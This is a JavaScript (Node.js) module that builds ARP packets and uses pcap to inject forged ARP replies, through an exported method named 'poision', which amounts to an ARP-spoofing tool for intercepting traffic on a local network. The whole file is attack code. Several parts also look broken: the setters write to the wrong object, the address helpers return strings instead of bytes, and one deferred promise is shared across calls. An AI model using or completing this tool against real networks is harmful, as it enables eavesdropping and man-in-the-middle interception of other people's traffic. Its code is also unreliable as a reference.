var ip = require('ip');
var getmac = require('getmac').getMac;
var defer = require('q').defer();
var pcap = require('pcap');

var ArpPkg = {
	eh_dst: ['ff', 'ff', 'ff', 'ff', 'ff', 'ff'],
	eh_src: ['ff', 'ff', 'ff', 'ff', 'ff', 'ff'],
	eh_type: [0x08, 0x06],
	hw_type: [0x00, 0x01],
	arp_proto: [0x80, 0x00],
	mac_length: [0x06],
	ip_length: [0x04],
	opcode: [0x00, 0x01],
	src_mac: ['ff', 'ff', 'ff', 'ff', 'ff', 'ff'],
	src_ip: ip_to_arr('192.168.0.1'),
	dst_mac: ['ff', 'ff', 'ff', 'ff', 'ff', 'ff'],
	dst_ip: ip_to_arr('192.168.0.2')
};

function Arp(){
	var instance;
	var interfaceSet = false;
	var session;
	var pkg;

	function init(){
		console.log('Arp Init ... ');
		getMac().then(loadMac).then(loadPkg).catch(errHandler);
		return {
			setDstMac: setDstMac,
			setDstIp: setDstIp,
			operation: setOperation,
			setSrcMac: setSrcMac,
			setSrcIp: setSrcIp,
			poision: send,
			setInterface: setInterface
		};
	}
	
	return {
		getInstance: function(){
			if(!instance) instance = init();
			return instance;
		}
	};
}

var arp = new Arp();

function setInterface(interface){
	try{
		arp.session = pcap.createSession(interface, '');
		arp.interfaceSet = true;
		console.log('Set interface to ' + (interface == null ? 'Default' : interface));
	}catch(e){
		arp.interfaceSet = false;
		console.error('ERROR: Interface set error. ' + e);
		process.exit(1);
	}
}

function send(){
	setOperation('response');
	if(!arp.interfaceSet){
		setInterface(null);
	}

	var pkg_arr = Object.keys(arp.pkg).map(function(key){
		return arp.pkg[key];
		});
	var arpRequest = new Buffer(pkg_arr);
	arp.session.inject(arpRequest);
	console.log('Arp Poision done.');
}

function setDstMac(dstMac){
	arp.eh_dst = mac_to_arr(dstMac);
	arp.dst_mac = mac_to_arr(dstMac);
}

function setDstIp(dstIp){
	arp.dst_ip = ip_to_arr(dstIp);
}

function setSrcMac(srcMac){
	arp.eh_src = mac_to_arr(srcMac);
	arp.src_mac = mac_to_arr(srcMac);
}

function setSrcIp(srcIp){
	arp.src_ip = ip_to_arr(srcIp);
}

function setOperation(opcode){
	if(opcode.toLowerCase().indexOf('request') >= 0){
		arp.opcode = [0x00, 0x01];
		return true;
	}else if(opcode.toLowerCase().indexOf('response') >= 0){
		arp.opcode = [0x00, 0x02];
		return true;
	}else{
		console.error('Error: Cannot resolve Opcode.');
		return false;
	}
}

function ip_to_arr(ipAddr){
	return  ipAddr.split('.');
}

function mac_to_arr(macAddr){
	return  macAddr.split(':');
}

function getMac(){
	getmac(function(err, macAddr){
		if(err) defer.reject(err);
		console.log('Get Mac Addr: ' + macAddr);
		defer.resolve(macAddr);
	});

	return defer.promise;
}

function loadMac(macAddr){
	var pkg = Object.create(ArpPkg);
	pkg.eh_src = mac_to_arr(macAddr);
	pkg.src_mac = mac_to_arr(macAddr);
	pkg.src_ip = ip_to_arr(ip.address());
	console.log('package: ' + pkg);
	defer.resolve(pkg);

	return defer.promise;
}

function loadPkg(pkg){
	arp.pkg = pkg;
	console.log('loading ' + arp.pkg);
}

function errHandler(err){
	console.log(err);
}

module.exports = arp;
